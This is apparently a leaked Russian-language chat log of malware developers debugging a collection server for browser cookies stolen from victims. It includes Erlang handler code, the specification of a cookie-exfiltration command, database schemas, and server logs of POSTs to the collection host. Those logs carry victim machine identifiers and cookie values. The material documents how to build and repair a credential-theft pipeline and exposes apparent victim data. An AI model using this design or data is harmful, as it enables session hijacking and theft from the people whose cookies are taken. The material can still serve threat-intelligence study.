Timestamp	From	To	Message
2021-08-27 10:23:21.385745	ttrr	hof	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:24:45.407839	ttrr	hof	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:28:23.148995	ttrr	hof	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-27 10:29:07.638292	hof	ttrr	1
2021-08-27 10:29:07.639930	ttrr	hof	1
2021-08-27 10:30:05.419498	ttrr	hof	тута
2021-08-27 10:30:05.420470	ttrr	hof	ждем остальных
2021-08-27 10:30:05.421669	ttrr	hof	ок
2021-08-27 10:30:05.421979	ttrr	hof	хай
2021-08-27 10:30:05.422456	ttrr	hof	я пароль не ставил на вход в конфу, это приемлемо?
2021-08-27 10:30:05.422835	ttrr	hof	это только для зарегистрированных участников
2021-08-27 10:30:05.423642	ttrr	hof	других тут не может быть
2021-08-27 10:30:05.424482	ttrr	hof	хоф остался
2021-08-27 10:30:23.082673	hof	ttrr	на месте
2021-08-27 10:30:23.083909	ttrr	hof	на месте
2021-08-27 10:30:28.879939	hof	ttrr	привет
2021-08-27 10:30:28.882112	ttrr	hof	привет
2021-08-27 10:34:32.662723	ttrr	hof	короче . проблема в хттп в том . что клиент обрывает коннект раньше, чем передает данные . а именно я грешу на то, что клиент не передает самый последний перевод строки
2021-08-27 10:35:13.162821	ttrr	hof	от этого возникает краш на моей стороне и я не могу обработать запрос
2021-08-27 10:35:33.428385	ttrr	hof	в http есть три способа получить флаг конца передачи
2021-08-27 10:35:41.727352	ttrr	hof	1. Content-Length
2021-08-27 10:35:47.131927	ttrr	hof	2. Connection: close
2021-08-27 10:36:04.114354	ttrr	hof	3. Content-Encoding: chunked и дальше отслеживается цепочка чанков
2021-08-27 10:36:15.503921	ttrr	hof	клиент о котором ты говоришь какой метод использует?
2021-08-27 10:36:21.266853	ttrr	hof	ты сам какой метод форсируешь на сервере?
2021-08-27 10:36:59.319197	ttrr	hof	defender добавь сюда flip и steller
2021-08-27 10:37:09.757237	ttrr	hof	да  я никакой не форсирую .есть либа . которая занимается хтпп .. она парсит и разбирает всё .. я лишь её вызываю . 
причем сделано это так .. что сначала работает она .. а потом уже я .. т.о. я не имею доступа напрямую к бинарному потоку данных
2021-08-27 10:37:22.169139	ttrr	hof	так вот разберись
2021-08-27 10:37:36.835002	ttrr	hof	у клиентов есть причина использовать наиболее простой метод
2021-08-27 10:37:55.061608	ttrr	hof	причина есть .если эта причина удовлетворяет спеицификациям хттп ..
2021-08-27 10:37:55.378717	ttrr	hof	например им сложно использовать chunked-передачу
2021-08-27 10:38:34.866927	ttrr	hof	и они скорее всего используют connection: close, то есть сигнал о конце передачи приходит с закрытием сокета
2021-08-27 10:38:38.661253	ttrr	hof	если либа падает - это значит что клиент отправляет не то что ожидает эта либа . т.е. не хттп
2021-08-27 10:39:02.449365	ttrr	hof	ты должен дать требования тем кто пишет клиенты, что эта либа умеет, а чего не умеет
2021-08-27 10:39:06.113076	ttrr	hof	либа ожидает на входе (бинарном) данные, но бинарный вход пуст .. вот парсер хттп и ломается
2021-08-27 10:39:17.551078	ttrr	hof	она умеет всё
2021-08-27 10:39:26.514531	ttrr	hof	как видим не всё
2021-08-27 10:39:29.431105	ttrr	hof	это промышленное решение .. и её пользуются очень многие
2021-08-27 10:39:40.117749	ttrr	hof	давай на примерах
2021-08-27 10:39:46.365048	ttrr	hof	примерах что ?
2021-08-27 10:39:51.190207	ttrr	hof	кривой посылки
2021-08-27 10:40:03.665991	ttrr	hof	выложи сюда кривую посылку со стороны модуля и скажи что в ней криво
2021-08-27 10:40:15.079052	ttrr	hof	еще раз . у меня нет доступа к бинарному потоку ..
2021-08-27 10:40:19.334459	ttrr	hof	либа от меня это скрывает
2021-08-27 10:40:31.498976	ttrr	hof	ну HTTP-запрос ты же можешь перехватить?
2021-08-27 10:40:39.271374	ttrr	hof	я лишь могу по ошибке сказать где сломалось у неё и я вижу что она ожидает данные - но данных нет
2021-08-27 10:40:52.889332	ttrr	hof	то есть ты даже не видишь сырые HTTP
2021-08-27 10:40:58.710534	ttrr	hof	нет
2021-08-27 10:41:03.476358	ttrr	hof	только через прокси какой могу
2021-08-27 10:41:07.275655	ttrr	hof	поставь mitmproxy
2021-08-27 10:41:18.241415	ttrr	hof	как можно отлаживать такую сложную систему наощупь?
2021-08-27 10:41:18.452648	ttrr	hof	ну или логи сделать внутри либы
2021-08-27 10:41:22.816112	ttrr	hof	это уже по живому надо
2021-08-27 10:41:51.573767	ttrr	hof	и флип и стеллер могут предъявить запросы HTTP которые они генерируют, и могут попытаться их исправить в соответствии с твоими указаниями
2021-08-27 10:42:05.075423	ttrr	hof	в общем давай я посмотрю тогда бинарный поток . лог сделаю на живом сервере ..
2021-08-27 10:42:05.582691	ttrr	hof	тебе лишь надо сказать где ошибка, по твоей версии
2021-08-27 10:42:08.861359	hof	ttrr	может убрать либу? получать данные с сокета?
2021-08-27 10:42:08.864968	ttrr	hof	может убрать либу? получать данные с сокета?
2021-08-27 10:42:10.027980	ttrr	hof	они тоже могут дать пример потока
2021-08-27 10:42:18.328863	ttrr	hof	парсить хттп сам будешь ?
2021-08-27 10:42:39.089513	ttrr	hof	@zulas так тут же важно именно сравнить то, что они отправляют, с тем, что ты принимаешь
2021-08-27 10:42:43.639580	ttrr	hof	мне щас надо на часок отлучится .. приду - сделаю - посмотрю
2021-08-27 10:42:44.193723	ttrr	hof	очень далеко не факт что это одно и то же
2021-08-27 10:42:44.436975	hof	ttrr	ну а какой выход?
2021-08-27 10:42:44.439347	ttrr	hof	ну а какой выход?
2021-08-27 10:42:52.131343	ttrr	hof	уже не раз так было
2021-08-27 10:42:54.117002	ttrr	hof	выход - разбираться
2021-08-27 10:42:55.653199	ttrr	hof	по пути у нас прокладки
2021-08-27 10:42:59.529356	ttrr	hof	и наши, и чужие
2021-08-27 10:43:06.790781	ttrr	hof	они жонглируют заголовками
2021-08-27 10:43:16.183234	ttrr	hof	они имеют право перекодировать пакеты
2021-08-27 10:43:18.436578	ttrr	hof	отошел
2021-08-27 12:29:10.138537	ttrr	hof	я на живом сейчас экспериментирую
2021-08-27 13:47:25.490055	ttrr	hof	мне все равно пока ничего не ясно из файлов
2021-08-27 13:47:25.491159	ttrr	hof	по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать
2021-08-27 13:47:25.491658	ttrr	hof	это бинарный поток который мне приходит ..
2021-08-27 13:47:25.491950	ttrr	hof	вот с первого байта
2021-08-27 13:47:25.492482	ttrr	hof	давайте поставлю nginx между клиентом и деро
2021-08-27 13:47:25.493170	ttrr	hof	поставь
2021-08-27 13:47:25.493529	ttrr	hof	и там может по логам что поймем
2021-08-27 13:47:25.494016	ttrr	hof	и пусть логирует все запросы ..
2021-08-27 13:47:25.494968	ttrr	hof	ок сейчас
2021-08-27 13:47:25.495564	ttrr	hof	запрос . тело . ответ
2021-08-27 13:47:25.495806	ttrr	hof	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:47:25.496391	ttrr	hof	а, драйвера не добавил сюда
2021-08-27 13:47:25.496892	ttrr	hof	нужен он?
2021-08-27 13:47:25.497510	ttrr	hof	я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз
2021-08-27 13:47:25.498179	ttrr	hof	вот кто это генерит - тот и нужен ..
2021-08-27 13:47:25.498700	ttrr	hof	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:47:25.499244	ttrr	hof	и нужно указание - что в нем криво
2021-08-27 13:47:25.499965	ttrr	hof	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:47:25.500662	ttrr	hof	> нам нужен прилетевший сырой HTTP-запрос как есть
я уже показал что мне прилетает .. вот это сырые данные
2021-08-27 13:47:25.501180	ttrr	hof	подождем что дефендер скажет
2021-08-27 13:49:10.565391	hof	ttrr	дело в том, что данные в dero посылает не один модуль
2021-08-27 13:49:10.568772	ttrr	hof	дело в том, что данные в dero посылает не один модуль
2021-08-27 13:49:18.701161	hof	ttrr	их много
2021-08-27 13:49:18.702697	ttrr	hof	их много
2021-08-27 13:49:49.133562	ttrr	hof	мы тут с зуласом разбираемся, там странно всё
2021-08-27 13:50:18.924244	hof	ttrr	нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало
2021-08-27 13:50:18.928522	ttrr	hof	нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало
2021-08-27 13:51:08.920369	ttrr	hof	давайте поставлю nginx между клиентом и деро
2021-08-27 13:51:08.921231	ttrr	hof	поставь
2021-08-27 13:51:08.921755	ttrr	hof	и там может по логам что поймем
2021-08-27 13:51:08.922429	ttrr	hof	и пусть логирует все запросы ..
2021-08-27 13:51:08.922906	ttrr	hof	ок сейчас
2021-08-27 13:51:08.923388	ttrr	hof	запрос . тело . ответ
2021-08-27 13:51:08.923989	ttrr	hof	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:51:08.924512	ttrr	hof	а, драйвера не добавил сюда
2021-08-27 13:51:08.925129	ttrr	hof	нужен он?
2021-08-27 13:51:08.925942	ttrr	hof	я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз
2021-08-27 13:51:08.926748	ttrr	hof	вот кто это генерит - тот и нужен ..
2021-08-27 13:51:08.927187	ttrr	hof	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:51:08.927559	ttrr	hof	и нужно указание - что в нем криво
2021-08-27 13:51:08.928262	ttrr	hof	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:51:08.929074	ttrr	hof	> нам нужен прилетевший сырой HTTP-запрос как есть
я уже показал что мне прилетает .. вот это сырые данные
2021-08-27 13:51:08.929567	ttrr	hof	подождем что дефендер скажет
2021-08-27 13:51:08.930349	ttrr	hof	дело в том, что данные в dero посылает не один модуль
2021-08-27 13:51:08.930809	ttrr	hof	их много
2021-08-27 13:51:08.931531	ttrr	hof	мы тут с зуласом разбираемся, там странно всё
2021-08-27 13:51:08.932322	ttrr	hof	нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало
2021-08-27 13:53:32.719441	hof	ttrr	и расчитывать на то, что данные будут невалидные
2021-08-27 13:53:32.721668	ttrr	hof	и расчитывать на то, что данные будут невалидные
2021-08-27 13:54:01.210491	hof	ttrr	их могут специально посылать
2021-08-27 13:54:01.215079	ttrr	hof	их могут специально посылать
2021-08-27 13:58:05.091199	ttrr	hof	ну я либу могу модифицировать . просто чтобы если экзепшн в какой-то области .. то в лог не падало и даже ответ можно слать я думаю
2021-08-27 13:58:24.130101	ttrr	hof	зулас говорит, что вот эти данные на яндекс диске - это и есть HTTP-запросы со всеми заголовками
2021-08-27 13:58:26.262951	ttrr	hof	точнее без них
2021-08-27 13:58:29.821177	ttrr	hof	а там бинарный поток
2021-08-27 13:58:48.997967	ttrr	hof	и если он хоть как-то парсится либой бэкенда, то это получается HTTP/2
2021-08-27 13:59:02.543417	ttrr	hof	и тогда возникает вопрос
- откуда у нас вообще HTTP/2?
2021-08-27 13:59:21.605865	ttrr	hof	ну или QUIC или еще какая бинарная гугловская фигня
2021-08-27 13:59:40.082074	ttrr	hof	defender: на прокладках случайно не включена конверсия в HTTP/2 ?
2021-08-27 14:04:43.782224	ttrr	hof	нет
2021-08-27 14:04:57.491318	ttrr	hof	прокладки - роутеры, что приняли то и передали
2021-08-27 14:07:15.102970	ttrr	hof	отлучился
2021-08-27 14:09:00.008438	ttrr	hof	defender: еще больше нужны сырые http-запросы теперь, в свете данных зуласа
2021-08-27 14:09:10.162721	ttrr	hof	если подтвердится что там не HTTP/1.1 то это очень интересно
2021-08-27 14:09:16.335183	ttrr	hof	нужно подтверждение от тебя
2021-08-27 14:13:25.745196	ttrr	hof	я делаю нджинкс
2021-08-27 14:15:45.066483	ttrr	hof	кстати zulas: ты можешь "хороший" запрос проследить до базы?
2021-08-27 14:15:51.255854	ttrr	hof	вот тот бинарный
2021-08-27 15:37:14.588796	ttrr	hof	вот тот бинарный
2021-08-27 15:37:14.590014	ttrr	hof	что значит послать до базы ?
2021-08-27 15:37:14.590622	ttrr	hof	@buza
2021-08-27 15:37:14.591368	ttrr	hof	не послать, а проследить
2021-08-27 15:37:14.592202	ttrr	hof	вот тебе пришел этот бинарный запрос
2021-08-27 15:37:14.592982	ttrr	hof	и ты говоришь что первый из них нормально парсится и отрабатывает
2021-08-27 15:37:14.593687	ttrr	hof	раз так, он должен положить в базу данных новую запись
2021-08-27 15:37:14.594491	ttrr	hof	эту запись можно увидеть?
2021-08-27 15:37:14.595143	ttrr	hof	там больше нет ничего ..
2021-08-27 15:37:14.595814	ttrr	hof	ну т.е. до базы оно не доходит
2021-08-27 15:37:14.596864	ttrr	hof	ни первый ни второй?
2021-08-27 15:37:14.597738	ttrr	hof	просто в логи ничего не пишется
2021-08-27 15:37:14.598886	ttrr	hof	да
2021-08-27 15:37:14.599850	ttrr	hof	ну так может это и не мы?
2021-08-27 15:37:14.600847	ttrr	hof	может это боты поисковые и т.п ?
2021-08-27 15:37:14.602023	ttrr	hof	defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?
2021-08-27 15:37:14.602668	ttrr	hof	все HTTP/2 QUIC и прочий модный кал
2021-08-27 15:37:14.603300	ttrr	hof	и запретить доступ к веб-серверу не с прокладки
2021-08-27 15:37:14.604233	ttrr	hof	нет не могу
2021-08-27 15:37:14.605268	ttrr	hof	говорю же там все как есть передает
2021-08-31 05:53:27.772288	ttrr	hof	defender@q3mcco35auwcstmt.onion/Psi+ приглашает вас в комнату ttrr@conference.q3mcco35auwcstmt.onion
2021-08-31 08:20:34.376261	ttrr	hof	ну и ?
2021-08-31 08:20:44.478700	ttrr	hof	одному мне больше всез надо ?
2021-08-31 08:21:25.224722	ttrr	hof	со вчера вечера что-то писали тут?
2021-08-31 08:23:54.170516	ttrr	hof	zulas: скинь еще раз кусок того POSTа, который был отвергнут бэком
2021-08-31 08:24:17.352878	ttrr	hof	А тут истории нет?
Писал по поводу новых полей в записи куки
2021-08-31 08:24:26.072636	ttrr	hof	нету истории
2021-08-31 08:26:45.196868	ttrr	hof	ну так на чем остановились?
2021-08-31 08:27:19.304871	ttrr	hof	я остановился на этом: вот был POST, с виду нормальный, бэк на него 403 сказал. Я попросил зуласа сказать что в нем не так
2021-08-31 08:27:38.959280	ttrr	hof	а я попросил расширить лог . чтобы логировало ответ
2021-08-31 08:27:51.225032	ttrr	hof	и размер запроса
2021-08-31 08:29:36.045925	ttrr	hof	а ты steller ?
2021-08-31 08:31:18.951717	ttrr	hof	Писал по поводу новых полей в записи куки
2021-08-31 08:33:03.543787	ttrr	hof	что именно?
2021-08-31 08:33:15.477739	ttrr	hof	403 встречалась раньше ошибка
-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="data"

user|Chrome|.google.com|ANID|	djEw171ep2SDF+UMAcWRRWBcsbp5H34/V0frREuTTKAE2F3BXw3fVVHhgYgcKidlSSPxtTs32WPiqcV/p021G67RLpNXgRDrMqljrJ16Ml1Ckwz2a2URAQ==|1588241125|1651313125|/
user|Chrome|.register.com|__utma|	djEwnpzEp2a3+eOKByaEj0nLtLL7HGvIusWq1obAuia9wTCz3pPEUF6A+gFpZ3LHPf2GSueVelCwgrXMR96kV8MmLcClokQ=|1588241143|1651313173|/

-----------CJLVIYOINTQPMYSU
Content-Disposition: form-data; name="source"

Chrome cookies
-----------CJLVIYOINTQPMYSU--

403
Mismatch parameters count!
2021-08-31 08:33:43.142854	ttrr	hof	zulas: сколько полей в куки у тебя сейчас?
steller: а у тебя?
2021-08-31 08:34:59.536183	ttrr	hof	[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path ]
2021-08-31 08:35:00.852836	ttrr	hof	вот поля
2021-08-31 08:35:14.269607	ttrr	hof	разделитель |
2021-08-31 08:35:28.666532	ttrr	hof	Разработчик админки планирует добавить 2 поля secure, httponly в конец записи.
Сейчас:
Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path
2021-08-31 08:35:46.674633	ttrr	hof	разделители строк: [ <<10>>, <<13,10>>]
2021-08-31 08:37:31.167311	ttrr	hof	403 была, когда некоторые поля не кодировались в В64. В отстойнике они безусловно декодировались.
2021-08-31 08:38:28.753341	ttrr	hof	А что по поводу максимального размера данных, он ограничен 64КБ будет?
2021-08-31 08:39:10.942687	ttrr	hof	{read_length, 64000},
{read_timeout, 50000}
я могу и больше сделать
2021-08-31 08:39:15.180254	ttrr	hof	таковы требоания были
2021-08-31 08:40:40.545044	ttrr	hof	50000 это в миллисекундах
2021-08-31 08:43:47.771928	ttrr	hof	В модуле нет такого ограничения. Можно разбить на несколько запросов, в принципе.
А какие ошибки отстойник может отдавать? Их желательно как-то обрабатывать.
403 добавил в обработку. На модуль приходили ещё 404 и 500. 500, видимо, от прокладки.
2021-08-31 08:45:02.921466	hof	ttrr	при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?
2021-08-31 08:45:02.926845	ttrr	hof	при успешном приеме и добавлении в базу dero всегда выдает 200 и /1/ ?
2021-08-31 08:45:20.938590	hof	ttrr	403 ошибка формата данных?
2021-08-31 08:45:20.942205	ttrr	hof	403 ошибка формата данных?
2021-08-31 08:45:42.349963	hof	ttrr	просо 200 бывает без /1/ ?
2021-08-31 08:45:42.352264	ttrr	hof	просо 200 бывает без /1/ ?
2021-08-31 08:45:46.769481	hof	ttrr	просто
2021-08-31 08:45:46.774282	ttrr	hof	просто
2021-08-31 08:46:17.066963	ttrr	hof	zulas:
2021-08-31 08:47:07.167796	hof	ttrr	зачем этот /1/ ?
2021-08-31 08:47:07.173807	ttrr	hof	зачем этот /1/ ?
2021-08-31 08:47:10.013185	ttrr	hof	reply(not_found, Req) ->
 { ok, Req1 } = cowboy_req:reply(404, [], <<"Not found">>, Req),
 Req1;

reply(forbidden, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [], <<"Forbidden">>, Req),
 Req1;

reply(missing_data, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing data field!">>, Req),
 Req1;

reply(missing_keys, Req) ->
 { ok, Req1 } = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Missing keys field!">>,  Req),
 Req1;

reply(missing_parameters, Req) ->
 {ok,Req1} = cowboy_req:reply(403, [{<<"Forbidden">>, <<"text/plain">>}], <<"Mismatch parameters count!">>,  Req),
 Req1;

reply(request_timeout, Req) ->
 {ok,Req1} = cowboy_req:reply(408, [{<<"Request Timeout">>, <<"text/plain">>}], <<"Request Timeout">>,  Req),
 Req1;
2021-08-31 08:47:16.138566	ttrr	hof	вот такие ошибки бывают
2021-08-31 08:47:22.019900	ttrr	hof	текст у вас отобразился ?
2021-08-31 08:47:31.375299	ttrr	hof	а то у меня пиджин -- и нифига
2021-08-31 08:47:40.865736	hof	ttrr	отразился
2021-08-31 08:47:40.874229	ttrr	hof	отразился
2021-08-31 08:48:11.903631	hof	ttrr	200 бывает без /1/ ?
2021-08-31 08:48:11.909320	ttrr	hof	200 бывает без /1/ ?
2021-08-31 08:48:50.549177	ttrr	hof	по коду вроде не бывает
2021-08-31 08:48:57.438478	hof	ttrr	почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?
2021-08-31 08:48:57.444719	ttrr	hof	почуму спрашиваю - нужно ли в модуле проверять получение /1/ или достаточно получить статус 200 ?
2021-08-31 08:49:06.642501	ttrr	hof	[11:47:07] <hof> зачем этот /1/ ?
так по тз
2021-08-31 08:49:25.813880	ttrr	hof	это типа следующая команда для клиента
2021-08-31 08:49:29.555474	hof	ttrr	т.е. 200 без /1/ не бывает?
2021-08-31 08:49:29.559042	ttrr	hof	т.е. 200 без /1/ не бывает?
2021-08-31 08:49:55.934309	ttrr	hof	не бывает
2021-08-31 08:50:06.566951	hof	ttrr	ок, отлично
2021-08-31 08:50:06.571332	ttrr	hof	ок, отлично
2021-08-31 08:50:53.720942	ttrr	hof	zulas: А сейчас логирование запросов http есть, их можно проверить?
2021-08-31 08:51:29.472656	ttrr	hof	есть
2021-08-31 08:52:48.118924	ttrr	hof	Скинь тогда проблемные запросы.
2021-08-31 08:58:25.521735	ttrr	hof	2021-08-31 11:52:22.415 [info] <0.6857.3> Data: <<"POST /tot57/WIN-U4U2CDE99LP_W617601.8C95D48B33FF1976677889D52ABB8859/84/ HTTP/1.0\r\nHost: 203.76.105.227\r\nX-Real-IP: 203.76.105.227\r\nX-Forwarded-For: 203.76.105.227\r\nConnection: close\r\nContent-Length: 11059\r\nAccept: */*\r\nContent-Type: multipart/form-data; boundary=---------MOBMWAMXGTKVMATK\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\r\nCache-Control: no-cache\r\n\r\n-----------MOBMWAMXGTKVMATK\r\nContent-Disposition: form-data; name=\"data\"\r\n\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L2NvbXBsZXRlL3NlYXJjaA==\r\nAdministrador|Chrome|Lmdvb2dsZS5jb20=|Q0dJQw==|RWhReFF6RkRTRUpFWDJWelRWZzVOakZOV0RrMk1TS0hBWFJsZUhRdmFIUnRiQ3hoY0hCc2FXTmhkR2x2Ymk5NGFIUnRiQ3Q0Yld3c1lYQndiR2xqWVhScGIyNHZlRzFzTzNFOU1DNDVMR2x0WVdkbEwyRjJhV1lzYVcxaFoyVXZkMlZpY0N4cGJXRm5aUzloY0c1bkxDb3ZLanR4UFRBdU9DeGhjSEJzYVdOaGRHbHZiaTl6YVdkdVpXUXRaWGhqYUdGdVoyVTdkajFpTXp0eFBUQXVPUQ==|1625670207|1641222207|L3NlYXJjaA==\r\nAdministrador|C...">>
 State: {state,#Port<0.108426>,ranch_tcp,[cowboy_router,cowboy_handler],false,[{listener,http},{dispatch,[{'_',[],[{['...'],[],http_handler,[{limits,32768,1024,4096,102400,8529920,8388608,1024}]}]}]}],undefined,undefined,5,1,100,4096,64,4096,100,5000,1630399947415}
 ReqEmpty 0
2021-08-31 11:52:22.416 [critical] <0.6857.3>@http_handler:handle:33 Error {badmatch,false} [{base64,decode_binary,2,[{file,"base64.erl"},{line,212}]},{http_handler,'-save84/3-fun-4-',5,[{file,"src/http_handler.erl"},{line,329}]},{lists,foreach,2,[{file,"lists.erl"},{line,1338}]},{http_handler,save84,3,[{file,"src/http_handler.erl"},{line,325}]},{http_handler,handle,2,[{file,"src/http_handler.erl"},{line,30}]},{cowboy_handler,handler_handle,4,[{file,"src/cowboy_handler.erl"},{line,111}]},{cowboy_protocol,execute,4,[{file,"src/cowboy_protocol.erl"},{line,443}]}]
2021-08-31 08:58:38.143140	ttrr	hof	вот . не может басе64 декодировать
2021-08-31 08:58:42.755242	ttrr	hof	не знаю какое поле
2021-08-31 08:59:10.715282	ttrr	hof	крашей больше нет
2021-08-31 08:59:29.609113	ttrr	hof	всмысли тех что хттп2
2021-08-31 09:05:10.045531	ttrr	hof	Это старые данные. Сейчас модуль отправляет Username, Domain, Cookie_name, Cookie_value, Path  в В64
2021-08-31 09:05:45.412223	ttrr	hof	[ Group, IdLow, IdHigh, base64:decode(Username), Browser, Domain, base64:decode(Cookie_name), base64:decode(Cookie_value), Created, Expires, base64:decode(Path) ]);

вот 4 поля декодируются только
2021-08-31 09:05:49.217317	ttrr	hof	надо все ?
2021-08-31 09:07:35.429061	ttrr	hof	Нужно домен ещё декодировать
2021-08-31 09:08:11.257811	ttrr	hof	ок .. добавил в новых версиях .
2021-08-31 09:09:24.731817	ttrr	hof	<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">> [<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]
2021-08-31 11:52:59.108 [error] <0.6879.3>@db:transform:58 Error {error,error,<<"22021">>,<<"invalid byte sequence for encoding \"UTF8\": 0x95">>,[]} with query {<<"INSERT INTO data84 (created_at, \"group\", id_low, id_high, username, browser, \"domain\", cookie_name, cookie_value, created, expires, path ) VALUES ( now(), $1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11 )">>,[<<"tot138">>,4268354464764256071,-5531770838041019469,<<149,166,247>>,<<"Firefox">>,<<".mail.ru">>,<<"mrcu">>,<<"14B45890605336B122FB29388502">>,<<"1399543312">>,<<"1714903312">>,<<"/">>]}

есть еще такое
2021-08-31 09:09:32.433326	ttrr	hof	на УТФ-8 не походит кодировка
2021-08-31 09:09:59.456064	ttrr	hof	И ещё нужно 2 поля добавить в конец записи.
secure, httponly
Значения: 0 & 1
2021-08-31 09:10:00.421978	ttrr	hof	насколько я понимаю это про <<149,166,247>>
2021-08-31 09:10:26.179746	ttrr	hof	в таблицу колонки ?
2021-08-31 09:10:55.309437	ttrr	hof	Да, в запись поле, в таблицу колонки.
2021-08-31 09:11:43.258346	ttrr	hof	А юникод в каком поле не проходит?
2021-08-31 09:20:09.638111	ttrr	hof	,<<149,166,247>> я думаю вот это не может быть юникодом
2021-08-31 09:20:45.228376	ttrr	hof	юзернейм
2021-08-31 09:22:08.345587	ttrr	hof	Похоже, пользователь. Скорее всего модуль не отправляет UTF8. Нужно проверить.
А ты можешь в readme этот формат добавить + описание ошибок?
Мы уже много времени потратили на поиск этих ошибок из-за отсутствия описания протокола обмена.
2021-08-31 09:23:06.136343	ttrr	hof	формат чего ?
2021-08-31 09:23:49.264092	ttrr	hof	в каталог doc есть некоторое описалово
2021-08-31 09:23:54.886092	ttrr	hof	Кукисов, например. Ещё бы хорошо остальные данные проверить.
2021-08-31 09:24:07.889614	ttrr	hof	Там кукисы описаны?
2021-08-31 09:24:16.336606	ttrr	hof	какие кукисы ?
2021-08-31 09:24:39.286951	ttrr	hof	Куки, печенюшки
2021-08-31 09:24:57.066718	ttrr	hof	я понял что такое куки, но к чему ты это говоришь ?
2021-08-31 09:25:05.871493	ttrr	hof	1. Создать новую команду для получения данных куки. Например, код команды 84

2. Создать таблицу для хранения данных (псевдокод SQL):
CREATE TABLE cookies (
  id SERIAL,
  username VARCHAR(255),
  browser VARCHAR(255)
  domain VARCHAR(255)
  cookie_name VARCHAR(255)
  cookie_value VARCHAR(255)
  created DATETIME,
  expires DATETIME,
  path VARCHAR(255)
);

3. Обеспечить прием данных в следующем формате:
- простой текст, разделенный на строки.
Разделитель строк - может быть как UNIX, так и DOS.
Одна строка - одна запись.
Разделитель полей в записи - вертикальная черта |
Формат записи:

username|browser|domain|cookie_name|cookie_value|created|expires|path\r\n

где

username     - имя пользователя
browser      - код броузера (enum = chrome|ff|ie|edge)
domain       - домен куки
cookie_name  - имя куки
cookie_value - значение куки
created      - дата-время создания, Unix time
expires      - дата-время истечения, Unix time
path         - путь URI
2021-08-31 09:26:49.567479	ttrr	hof	К тому, что у меня не было этого дока. Где описание В64? Это часть формата.
2021-08-31 09:28:37.307307	ttrr	hof	нету про базе64 .. сами добавили очевидно
2021-08-31 09:28:51.262142	ttrr	hof	чтобы экранировать символы
2021-08-31 09:29:50.578167	ttrr	hof	Ну, вот это и нужно в доку добавить.
created у нас в секундах?
2021-08-31 09:30:27.365937	ttrr	hof	created_at я ставлю сам как NOW()
2021-08-31 09:30:36.635708	ttrr	hof	Не догадываться же, как там отстойник обрабатывает, верно?
2021-08-31 09:31:00.363613	ttrr	hof	а .есть другой ..
2021-08-31 09:31:02.581797	ttrr	hof	щас посмотрю
2021-08-31 09:31:21.651585	ttrr	hof	А NOW() в секундах?
2021-08-31 09:32:35.414837	ttrr	hof	забей на NOW() это другое
2021-08-31 09:36:27.498895	ttrr	hof	CREATE TABLE public.data84 (
    id_low bigint NOT NULL,
    id_high bigint NOT NULL,
    "group" character varying(64),
    created_at timestamp without time zone,
    username text,
    browser text,
    domain text,
    cookie_name text,
    cookie_value text,
    created text,
    expires text,
    path text
);
2021-08-31 09:36:31.363979	ttrr	hof	вот таблица
2021-08-31 09:36:37.406424	ttrr	hof	created - просто текст
2021-08-31 09:36:41.642186	ttrr	hof	нету про базе64 .. сами добавили очевидно 
Ну, не для всех очевидно ) У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.
2021-08-31 09:36:43.349041	ttrr	hof	всё - просто текст
2021-08-31 09:37:34.040053	ttrr	hof	> У нас каждый своей частью работы занимается, кто там что правит - зачастую неизвестно.  
очевидно не я один это добавлял и не только на моей стороне, иначе не работало бы.
коду уже 5 лет
2021-08-31 09:39:30.948511	ttrr	hof	Ну, это тоже не очевидно)
